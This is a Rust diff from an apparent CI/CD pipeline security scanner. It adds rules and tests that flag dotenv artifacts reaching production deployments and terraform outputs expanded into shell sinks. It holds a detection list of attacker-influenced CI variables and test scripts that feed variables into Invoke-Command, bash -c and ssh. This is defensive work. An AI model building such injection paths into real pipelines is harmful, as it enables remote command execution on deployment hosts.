+        let producer_uses_untrusted_input = matched.iter().any(|(pid, _)| {
+            graph
+                .node(*pid)
+                .and_then(|n| n.metadata.get(META_SCRIPT_BODY))
+                .map(|b| script_uses_attacker_influenced_ci_var(b))
+                .unwrap_or(false)
+        });
+
+        if !production_like && !producer_uses_untrusted_input {
+            continue; // benign dotenv flow — skip
+        }
+
+        let severity = if production_like {
+            Severity::High
+        } else {
+            Severity::Medium
+        };
+
+        let producer_names: Vec<String> = upstream_jobs
+            .iter()
+            .filter(|j| producers.contains_key(**j))
+            .map(|s| (*s).to_string())
+            .collect();
+
+        let env_suffix = if production_like {
+            if env_name.is_empty() {
+                format!(" targeting production-like job name '{consumer_job}'")
+            } else {
+                format!(" targeting production-like environment '{env_name}'")
+            }
+        } else {
+            String::new()
+        };
+        let trust_suffix = if producer_uses_untrusted_input {
+            " (producer script reads attacker-influenced CI variables — branch/MR-source names propagate into the dotenv values)"
+        } else {
+            ""
+        };
+
+        let mut nodes_involved = vec![consumer.id];
+        nodes_involved.extend(matched.iter().map(|(id, _)| *id));
+
+        findings.push(Finding {
+            severity,
+            category: FindingCategory::DotenvArtifactFlowsToPrivilegedDeployment,
+            path: None,
+            nodes_involved,
+            message: format!(
+                "Step '{}' consumes a dotenv artifact from upstream job(s) [{}]{}{} — variables defined in the upstream's `artifacts.reports.dotenv` are silently promoted to the pipeline variable namespace, indistinguishable from pipeline-level variables in subsequent jobs",
+                consumer.name,
+                producer_names.join(", "),
+                env_suffix,
+                trust_suffix
+            ),
+            recommendation: Recommendation::Manual {
+                action: "Treat dotenv outputs as untrusted: pin the producer to a protected branch/tag context only, validate variable values in the consumer before use, and prefer explicit `needs:[…].artifacts: false` plus pipeline-scoped variables for deployment selection. Never let dotenv-promoted values choose service connections, deploy targets, or registry destinations without an allowlist check.".into(),
+            },
+            source: FindingSource::BuiltIn,
+                extras: FindingExtras::default(),
+});
+    }
+
+    findings
+}
+
+/// True when an environment name matches common production-like patterns.
+fn is_production_environment(name: &str) -> bool {
+    if name.is_empty() {
+        return false;
+    }
+    let lower = name.to_lowercase();
+    const TOKENS: &[&str] = &["prod", "production", "prd", "live"];
+    for token in TOKENS {
+        // Match either as a whole word or a `/`-separated segment, e.g.
+        // `production/eu-west-1`, `prod-cluster`.
+        if lower == *token {
+            return true;
+        }
+        if lower.starts_with(&format!("{token}-"))
+            || lower.starts_with(&format!("{token}/"))
+            || lower.contains(&format!("/{token}/"))
+            || lower.contains(&format!("-{token}-"))
+            || lower.ends_with(&format!("/{token}"))
+            || lower.ends_with(&format!("-{token}"))
+        {
+            return true;
+        }
+    }
+    false
+}
+
+/// True when an inline script reads CI variables that carry attacker-controllable
+/// content (branch names, MR source/target refs, tag refs, commit messages).
+fn script_uses_attacker_influenced_ci_var(script: &str) -> bool {
+    const NEEDLES: &[&str] = &[
+        "CI_COMMIT_REF_NAME",
+        "CI_COMMIT_BRANCH",
+        "CI_COMMIT_TAG",
+        "CI_COMMIT_MESSAGE",
+        "CI_COMMIT_TITLE",
+        "CI_COMMIT_DESCRIPTION",
+        "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME",
+        "CI_MERGE_REQUEST_TITLE",
+        "CI_MERGE_REQUEST_DESCRIPTION",
+    ];
+    NEEDLES.iter().any(|n| script.contains(n))
 }
 
 /// Rule: secret laundered through `$GITHUB_ENV` reaches an untrusted consumer
@@ -3841,66 +6478,6 @@ fn apply_compensating_controls(graph: &AuthorityGraph, findings: &mut [Finding])
             _ => {}
         }
     }
-}
-
-pub fn run_all_rules(graph: &AuthorityGraph, max_hops: usize) -> Vec<Finding> {
-    let mut findings = Vec::new();
-    // MVP rules
-    findings.extend(authority_propagation(graph, max_hops));
-    findings.extend(over_privileged_identity(graph));
-    findings.extend(unpinned_action(graph));
-    findings.extend(untrusted_with_authority(graph));
-    findings.extend(artifact_boundary_crossing(graph));
-    // Stretch rules
-    findings.extend(long_lived_credential(graph));
-    findings.extend(floating_image(graph));
-    findings.extend(persisted_credential(graph));
-    findings.extend(trigger_context_mismatch(graph));
-    findings.extend(cross_workflow_authority_chain(graph));
-    findings.extend(authority_cycle(graph));
-    findings.extend(uplift_without_attestation(graph));
-    findings.extend(self_mutating_pipeline(graph));
-    findings.extend(checkout_self_pr_exposure(graph));
-    findings.extend(variable_group_in_pr_job(graph));
-    findings.extend(self_hosted_pool_pr_hijack(graph));
-    findings.extend(service_connection_scope_mismatch(graph));
-    findings.extend(template_extends_unpinned_branch(graph));
-    findings.extend(template_repo_ref_is_feature_branch(graph));
-    findings.extend(vm_remote_exec_via_pipeline_secret(graph));
-    findings.extend(short_lived_sas_in_command_line(graph));
-    // ADO inline-script secret-leak rules
-    findings.extend(secret_to_inline_script_env_export(graph));
-    findings.extend(secret_materialised_to_workspace_file(graph));
-    findings.extend(keyvault_secret_to_plaintext(graph));
-    findings.extend(terraform_auto_approve_in_prod(graph));
-    findings.extend(addspn_with_inline_script(graph));
-    findings.extend(parameter_interpolation_into_shell(graph));
-    // GHA red-team-derived rules
-    findings.extend(runtime_script_fetched_from_floating_url(graph));
-    findings.extend(pr_trigger_with_floating_action_ref(graph));
-    findings.extend(untrusted_api_response_to_env_sink(graph));
-    findings.extend(pr_build_pushes_image_with_floating_credentials(graph));
-    // Composition-gap rule: env-gate laundering into untrusted consumer.
-    findings.extend(secret_via_env_gate_to_untrusted_consumer(graph));
-    // Blue-team positive invariants (negative-space rules — fire on absence
-    // of expected defenses)
-    findings.extend(no_workflow_level_permissions_block(graph));
-    findings.extend(prod_deploy_job_no_environment_gate(graph));
-    findings.extend(long_lived_secret_without_oidc_recommendation(graph));
-    findings.extend(pull_request_workflow_inconsistent_fork_check(graph));
-    findings.extend(gitlab_deploy_job_missing_protected_branch_only(graph));
-
-    // Blue-team compensating-control suppressions (downgrade or suppress
-    // existing-rule findings when a control elsewhere in the graph
-    // neutralises the risk). Applied AFTER all rules emit so the
-    // suppressions can see every finding alongside the graph.
-    apply_compensating_controls(graph, &mut findings);
-
-    apply_confidence_cap(graph, &mut findings);
-
-    findings.sort_by_key(|f| f.severity);
-
-    findings
 }
 
 #[cfg(test)]
@@ -6816,6 +9393,131 @@ mod tests {
         assert!(pull_request_workflow_inconsistent_fork_check(&g).is_empty());
     }
 
+    // ── terraform_output_via_setvariable_shell_expansion ─────
+
+    /// Helper: add a Step node tagged with the given job and an inline
+    /// script body. Returns the node id so the caller can wire it up.
+    fn add_script_step_in_job(g: &mut AuthorityGraph, name: &str, job: &str, body: &str) -> NodeId {
+        let mut meta = std::collections::HashMap::new();
+        meta.insert(META_SCRIPT_BODY.into(), body.into());
+        meta.insert(META_JOB_NAME.into(), job.into());
+        g.add_node_with_metadata(NodeKind::Step, name, TrustZone::FirstParty, meta)
+    }
+
+    #[test]
+    fn tf_output_setvariable_fires_on_solarwinds_corpus_pattern() {
+        // Faithful reproduction of the
+        // `Azure_Landing_Zone/sharedservice-solarwinds/.pipeline/deployment.yml`
+        // pattern (lines ~98-180 of the corpus exemplar): a PowerShell@2
+        // step reads `$env:TF_OUT_GDSVMS` and emits
+        // `##vso[task.setvariable variable=gdsvms]`. A later
+        // AzurePowerShell@5 step does `"$(gdsvms)" -split ","` followed by
+        // `Invoke-Command` against each VM in the list.
+        let mut g = AuthorityGraph::new(source("ado.yml"));
+        add_script_step_in_job(
+            &mut g,
+            "capture-tf-outputs",
+            "Deployment_Apply",
+            "Write-Host \"TF_OUT_GDSVMS: $env:TF_OUT_GDSVMS\"\n\
+             Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"\n\
+             Write-Host \"##vso[task.setvariable variable=amlinvms]$env:TF_OUT_AMLINVMS\"",
+        );
+        add_script_step_in_job(
+            &mut g,
+            "join-vms-to-domain",
+            "Deployment_Apply",
+            "$GDSvmNames = \"$(gdsvms)\" -split \",\"\n\
+             foreach ($vmName in $GDSvmNames) {\n\
+               Invoke-Command -ComputerName $vmName -ScriptBlock { Add-Computer }\n\
+             }",
+        );
+
+        let findings = terraform_output_via_setvariable_shell_expansion(&g);
+        // Two captured variables (gdsvms, amlinvms) but only `gdsvms` is
+        // referenced in the sink — exactly one finding.
+        assert_eq!(findings.len(), 1, "got: {findings:#?}");
+        assert_eq!(findings[0].severity, Severity::High);
+        assert_eq!(
+            findings[0].category,
+            FindingCategory::TerraformOutputViaSetvariableShellExpansion
+        );
+        assert!(findings[0].message.contains("gdsvms"));
+        assert!(findings[0].nodes_involved.len() == 2);
+    }
+
+    #[test]
+    fn tf_output_setvariable_fires_on_literal_terraform_output_cli() {
+        // Variant: the capture step actually shells out to
+        // `terraform output -raw vm_names` instead of going through the
+        // `TF_OUT_*` env-var convention. Sink uses bash -c "$(NAME)".
+        let mut g = AuthorityGraph::new(source("ado.yml"));
+        add_script_step_in_job(
+            &mut g,
+            "tf-capture",
+            "deploy",
+            "VMS=$(terraform output -raw vm_names)\n\
+             echo \"##vso[task.setvariable variable=vms;]$VMS\"",
+        );
+        add_script_step_in_job(
+            &mut g,
+            "tf-consume",
+            "deploy",
+            "bash -c \"for vm in $(vms); do ssh $vm uptime; done\"",
+        );
+
+        let findings = terraform_output_via_setvariable_shell_expansion(&g);
+        assert_eq!(findings.len(), 1, "got: {findings:#?}");
+        assert!(findings[0].message.contains("vms"));
+    }
+
+    #[test]
+    fn tf_output_setvariable_skips_when_only_phase_one_present() {
+        // Capture step exists, but no later step in the same job ever
+        // references the captured variable in shell-expansion position.
+        let mut g = AuthorityGraph::new(source("ado.yml"));
+        add_script_step_in_job(
+            &mut g,
+            "capture",
+            "deploy",
+            "Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"",
+        );
+        add_script_step_in_job(
+            &mut g,
+            "innocuous-print",
+            "deploy",
+            "Write-Host 'Deployment complete.'",
+        );
+
+        let findings = terraform_output_via_setvariable_shell_expansion(&g);
+        assert!(
+            findings.is_empty(),
+            "phase-1-only must not fire; got: {findings:#?}"
+        );
+    }
+
+    #[test]
+    fn tf_output_setvariable_skips_when_only_phase_two_present() {
+        // Sink step uses $(gdsvms) in shell-expansion position, but no
+        // earlier step in the same job ever captured a terraform output
+        // and emitted a setvariable for that name. Variable might be
+        // defined elsewhere (variable group, vars yaml) — out of scope.
+        let mut g = AuthorityGraph::new(source("ado.yml"));
+        add_script_step_in_job(&mut g, "noop-first", "deploy", "echo 'starting deploy'");
+        add_script_step_in_job(
+            &mut g,
+            "consume-only",
+            "deploy",
+            "$names = \"$(gdsvms)\" -split \",\"\n\
+             foreach ($n in $names) { Invoke-Command -ComputerName $n -ScriptBlock {} }",
+        );
+
+        let findings = terraform_output_via_setvariable_shell_expansion(&g);
+        assert!(
+            findings.is_empty(),
+            "phase-2-only must not fire; got: {findings:#?}"
+        );
+    }
+
     #[test]
     fn inconsistent_fork_check_skips_non_pr_trigger() {
         let mut g = graph_with_platform("github-actions", ".github/workflows/push.yml");
@@ -7024,5 +9726,90 @@ mod tests {
             "workflow-level over_priv must downgrade to Info when narrower job override exists"
         );
         assert!(demoted.message.contains("suppressed"));
+    }
+
+    #[test]
+    fn tf_output_setvariable_skips_when_sink_quotes_in_env_block() {
+        // Sink step references `$(gdsvms)` only in `echo "$(gdsvms)"` —
+        // a context with no shell-expansion sigils (no bash -c, no eval,
+        // no Invoke-Command, no -split, no command substitution, not
+        // line-leading). The value is quoted by the shell on its way
+        // into echo's argv and never reaches an interpreter.
+        let mut g = AuthorityGraph::new(source("ado.yml"));
+        add_script_step_in_job(
+            &mut g,
+            "capture",
+            "deploy",
+            "Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"",
+        );
+        add_script_step_in_job(
+            &mut g,
+            "safe-echo",
+            "deploy",
+            "echo \"gdsvms is: $(gdsvms)\"",
+        );
+
+        let findings = terraform_output_via_setvariable_shell_expansion(&g);
+        assert!(
+            findings.is_empty(),
+            "properly-quoted echo must not fire; got: {findings:#?}"
+        );
+    }
+
+    #[test]
+    fn tf_output_setvariable_skips_when_sink_in_different_job() {
+        // Capture and sink exist, but in different jobs. Pipeline
+        // variable scoping in ADO is per-stage/per-job by default — the
+        // chain doesn't compose without explicit cross-job output
+        // wiring (which is a separate primitive).
+        let mut g = AuthorityGraph::new(source("ado.yml"));
+        add_script_step_in_job(
+            &mut g,
+            "capture",
+            "job-a",
+            "Write-Host \"##vso[task.setvariable variable=gdsvms]$env:TF_OUT_GDSVMS\"",
+        );
+        add_script_step_in_job(
+            &mut g,
+            "consume",
+            "job-b",
+            "$names = \"$(gdsvms)\" -split \",\"\n\
+             foreach ($n in $names) { Invoke-Command -ComputerName $n -ScriptBlock {} }",
+        );
+
+        let findings = terraform_output_via_setvariable_shell_expansion(&g);
+        assert!(
+            findings.is_empty(),
+            "cross-job chain must not fire; got: {findings:#?}"
+        );
+    }
+
+    #[test]
+    fn tf_output_setvariable_skips_when_setvariable_lacks_tf_capture_signal() {
+        // Inline script emits `task.setvariable` but the source value is
+        // a plain pipeline variable, not anything terraform-shaped.
+        // Without a TF_OUT_* / `terraform output` capture signal in the
+        // body, the rule must not fire — `self_mutating_pipeline`
+        // already covers the generic setvariable primitive.
+        let mut g = AuthorityGraph::new(source("ado.yml"));
+        add_script_step_in_job(
+            &mut g,
+            "pure-setvar",
+            "deploy",
+            "Write-Host \"##vso[task.setvariable variable=gdsvms]$(BuildId)\"",
+        );
+        add_script_step_in_job(
+            &mut g,
+            "consume",
+            "deploy",
+            "$names = \"$(gdsvms)\" -split \",\"\n\
+             foreach ($n in $names) { Invoke-Command -ComputerName $n -ScriptBlock {} }",
+        );
+
+        let findings = terraform_output_via_setvariable_shell_expansion(&g);
+        assert!(
+            findings.is_empty(),
+            "setvariable without terraform-output signal must not fire; got: {findings:#?}"
+        );
     }
 }
